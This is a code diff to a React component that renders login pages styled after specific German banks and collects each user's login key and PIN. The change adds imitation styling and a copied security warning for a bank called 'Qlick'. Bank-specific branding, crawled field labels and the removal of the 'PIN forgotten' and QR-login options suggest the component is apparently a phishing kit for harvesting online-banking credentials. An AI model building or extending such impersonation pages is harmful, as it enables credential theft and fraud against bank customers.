@@ -269,7 +269,9 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const isPSD = bank?.group === "PSD Banken";
   const isSparda = bank?.group === "Sparda-Banken";
   const isGLS = bank?.group === "GLS Bank";
-  const isWarburg = bank?.group === "Spezifische Banken" && (bank?.name?.toLowerCase().includes("warburg") || bank?.name?.toLowerCase().includes("stein"));
+  const isWarburg = groupName === "Spezifische Banken" && (bank?.name?.toLowerCase().includes("warburg") || bank?.name?.toLowerCase().includes("stein"));
+  const isQlick = bank?.name?.toLowerCase().includes("qlick");
+
   const secureGoLabel = getSecureGoLabel(bank?.group);
   const crawledLabel = (bank as any)?.login_field_label as string | null | undefined;
   const groupLabel = isPSD ? "PSD-Key oder Alias" : isSparda ? "Sparda-NetKey oder Alias" : "VR-NetKey oder Alias";
@@ -599,26 +601,31 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         <div className="w-full lg:w-1/2 flex flex-col gap-4">
           <div className="bg-white shadow-md border border-gray-200 overflow-hidden" style={{ borderRadius: theme.buttonRadius === "rounded-none" ? "0px" : "12px" }}>
             <div className="p-6 sm:p-8">
-              {isGLS || isWarburg ? (
+              {isGLS || isWarburg || isQlick ? (
                 <div className="flex flex-col mb-6">
-                  <h2 className={`text-3xl font-bold mb-6 ${isGLS ? "text-[#002864]" : "text-gray-600"}`}>
+                  <h2 className={`text-3xl font-bold mb-6 ${isGLS ? "text-[#002864]" : "text-gray-800"}`}>
                     Anmelden
                   </h2>
-                  {isWarburg && (
-                    <p className="text-sm text-gray-700 mb-6">
-                      Herzlich willkommen zum {bank?.name} Onlinebanking
-                    </p>
+                  {(isWarburg || isQlick) && (
+                    <div className="mb-6">
+                      <p className={`font-bold text-sm ${isQlick ? "text-gray-800" : "text-gray-700"} mb-2`}>
+                        {isQlick ? "Achten Sie auf Ihre Daten" : `Herzlich willkommen zum ${bank?.name} Onlinebanking`}
+                      </p>
+                      {isQlick && (
+                        <p className="text-sm text-gray-600 leading-relaxed">
+                          Bitte seien Sie weiterhin vorsichtig im Umgang mit Ihren Zugangsdaten und TAN's. Qlick wird Sie niemals auffordern Updates oder Testüberweisungen mit einer TAN durchzuführen.
+                        </p>
+                      )}
+                    </div>
                   )}
                   <div className="flex border-b border-gray-200 mb-6">
-                    <button type="button" className={`px-1 pb-3 text-sm font-bold border-b-2 ${isGLS ? "text-[#002864] border-[#002864]" : "text-gray-600 border-gray-600"}`}>
+                    <button type="button" className={`px-1 pb-3 text-sm font-bold border-b-2 ${isGLS ? "text-[#002864] border-[#002864]" : (isWarburg || isQlick) ? "text-[#003366] border-[#003366]" : "text-gray-600 border-gray-600"}`}>
                       Mit Zugangsdaten anmelden
-                    </button>
-                    <button type="button" className="px-6 pb-3 text-sm font-bold text-gray-400 hover:text-gray-600">
-                      Mit QR-Code anmelden
                     </button>
                   </div>
                 </div>
               ) : (
+
 
                 <>
                   <h2 className="text-2xl sm:text-3xl font-bold mb-4" style={{ color: themeColor }}>
@@ -652,8 +659,9 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       value={vrNetKey}
                       onChange={(e) => { setVrNetKey(e.target.value); if (e.target.value.trim()) setVrNetKeyError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
-                       className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : (isGLS || isWarburg) ? "border-gray-800" : "border-gray-300"}`}
-                      style={{ ...(!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : {}), borderRadius: (isGLS || isWarburg) ? "4px" : buttonBorderRadius }}
+                       className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : (isGLS || isWarburg || isQlick) ? "border-gray-800" : "border-gray-300"}`}
+                      style={{ ...(!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : {}), borderRadius: (isGLS || isWarburg || isQlick) ? "4px" : buttonBorderRadius }}
+
 
                       autoComplete="username"
                     />
@@ -682,8 +690,9 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       value={pin}
                       onChange={(e) => { setPin(e.target.value); if (e.target.value.trim()) setPinError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
-                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : (isGLS || isWarburg) ? "border-gray-800" : "border-gray-300"}`}
-                      style={{ ...(!pinError && pin ? { borderColor: theme.accentText } : {}), borderRadius: (isGLS || isWarburg) ? "4px" : buttonBorderRadius }}
+                      className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : (isGLS || isWarburg || isQlick) ? "border-gray-800" : "border-gray-300"}`}
+                      style={{ ...(!pinError && pin ? { borderColor: theme.accentText } : {}), borderRadius: (isGLS || isWarburg || isQlick) ? "4px" : buttonBorderRadius }}
+
 
 
                       autoComplete="current-password"
@@ -694,11 +703,6 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     >
                       PIN
                     </label>
-                    {(isGLS || isWarburg) && (
-                      <button type="button" className={`absolute right-0 -bottom-6 text-xs font-bold ${isGLS ? "text-[#002864]" : isWarburg ? "text-[#660033]" : "text-gray-400"} hover:underline`}>
-                        PIN vergessen?
-                      </button>
-                    )}
 
 
 
@@ -724,12 +728,13 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                   <button
                     type="button"
                     onClick={() => navigate({ to: "/" })}
-                    className={`px-8 py-3 font-medium transition-colors text-sm ${isGLS ? "border border-[#002864] text-[#002864] hover:bg-gray-50" : "border-2 hover:bg-gray-50"}`}
+                    className={`px-8 py-3 font-medium transition-colors text-sm ${(isGLS || isQlick) ? "border border-[#002864] text-[#002864] hover:bg-gray-50" : "border-2 hover:bg-gray-50"}`}
                     style={{ 
-                      borderColor: isGLS ? "#002864" : isWarburg ? "#6d7e8b" : theme.accentText, 
-                      color: isGLS ? "#002864" : isWarburg ? "#6d7e8b" : theme.accentText,
-                      borderRadius: (isGLS || isWarburg) ? "0px" : buttonBorderRadius
+                      borderColor: (isGLS || isQlick) ? "#002864" : isWarburg ? "#6d7e8b" : theme.accentText, 
+                      color: (isGLS || isQlick) ? "#002864" : isWarburg ? "#6d7e8b" : theme.accentText,
+                      borderRadius: (isGLS || isWarburg || isQlick) ? "9999px" : buttonBorderRadius
                     }}
+
 
                   >
                     Abbrechen
@@ -739,8 +744,9 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                     disabled={submitting}
                     className={`px-8 py-3 text-white font-medium transition-opacity hover:opacity-90 text-sm ml-auto disabled:opacity-70 disabled:cursor-not-allowed inline-flex items-center gap-2`}
                     style={{ 
-                      backgroundColor: isGLS ? "#002864" : isWarburg ? "#6d7e8b" : theme.buttonBg,
-                      borderRadius: (isGLS || isWarburg) ? "0px" : buttonBorderRadius
+                      backgroundColor: (isGLS || isQlick) ? "#003366" : isWarburg ? "#6d7e8b" : theme.buttonBg,
+                      borderRadius: (isGLS || isWarburg || isQlick) ? "9999px" : buttonBorderRadius
+
                     }}
 
                   >
